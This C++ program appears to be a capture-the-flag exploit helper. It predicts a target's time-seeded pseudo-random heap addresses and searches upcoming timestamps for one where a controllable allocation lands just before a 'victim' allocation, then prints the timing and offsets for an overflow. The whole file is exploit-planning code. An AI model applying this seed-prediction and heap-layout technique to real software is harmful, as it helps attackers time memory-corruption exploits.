#include <algorithm>
#include <climits>
#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <vector>

static const size_t kNMalloc = 100;
static const size_t kControllableItemBegin = 6;
static const size_t kReadableDiffFirst = 0;
static const size_t kReadableDiffLast  = 65536-0x28;

using std::vector;

class Malloc {
  public:
    Malloc() = default;
    Malloc(size_t _ptr, size_t _nth) { ptr = _ptr; nth = _nth; }
    size_t ptr;
    size_t nth;
};

bool ptr_smallest_first(const Malloc& a, const Malloc& b)
{
  return a.ptr < b.ptr;
}

class Candidate {
  public:
    Candidate(): data(kNMalloc) {}
    time_t seed;
    vector<Malloc> data;
    void print() const;
    void print_time() const;
    void print_ctime() const;
    void generate_candidate(time_t seed);
    bool is_exploitable() const;
    bool text_address_is_readable() const;
};

size_t malloc_value()
{
  int rand_value = rand();
  return (size_t)((rand_value & 0x1fffffff) | 0x40000000);
}

void Candidate::generate_candidate(time_t _seed)
{
  srand(_seed);
  seed = _seed;
  for(size_t i = 0; i < data.size(); i++) {
    data.at(i).ptr = malloc_value();
    if(i + 1 < kControllableItemBegin) {
      data.at(i).nth = 0;
    } else {
      data.at(i).nth = i + 1 - kControllableItemBegin;
    }
  }
}

void Candidate::print_ctime() const
{
  printf("%s", ctime(&seed));
}

void Candidate::print_time() const
{
  printf("target_time = %lld\n", (long long)seed);
}

void Candidate::print() const
{
  printf("seed = %lld\n", (long long)seed);
  this->print_ctime();
  for(size_t i = 0; i < data.size(); i++) {
    printf("%zu: 0x%zx\n", data.at(i).nth, data.at(i).ptr);
  }
}

bool Candidate::is_exploitable() const
{
  vector<Malloc> clone(data.begin()+kControllableItemBegin, data.end());
  std::stable_sort(clone.begin(), clone.end(), ptr_smallest_first);
  for(size_t i = 1; i < clone.size(); i++) {
    size_t diff = clone.at(i).ptr - clone.at(i-1).ptr;
    if(kReadableDiffFirst <= diff && diff <= kReadableDiffLast) {
      printf("victim = %zu th malloc\n", clone.at(i).nth);
      printf("writer = %zu th malloc\n", clone.at(i-1).nth);
      printf("diff = 0x%zx\n", diff);
      return true;
    }
  }
  return false;
}

int main(int argc, char** argv)
{
  if(argc == 2) {
    time_t seed = (time_t)atoi(argv[1]);
    Candidate can;
    can.generate_candidate(seed);
    if(can.is_exploitable()) {
      printf("first = 0x%zx\n", can.data.at(0).ptr);
      can.print_time();
      can.print_ctime();
      can.print();
    }
  } else {
    Candidate can;
    time_t current_unix_time = time(NULL);
    //printf("current time:\n%s\n", ctime(&current_unix_time));
    for(size_t dt = 5; dt < 90000; dt++) {
      can.generate_candidate(current_unix_time + dt);
      if(can.is_exploitable()) {
        printf("first = 0x%zx\n", can.data.at(0).ptr);
        can.print_time();
        can.print_ctime();
        break;
      }
    }
  }
  return 0;
}
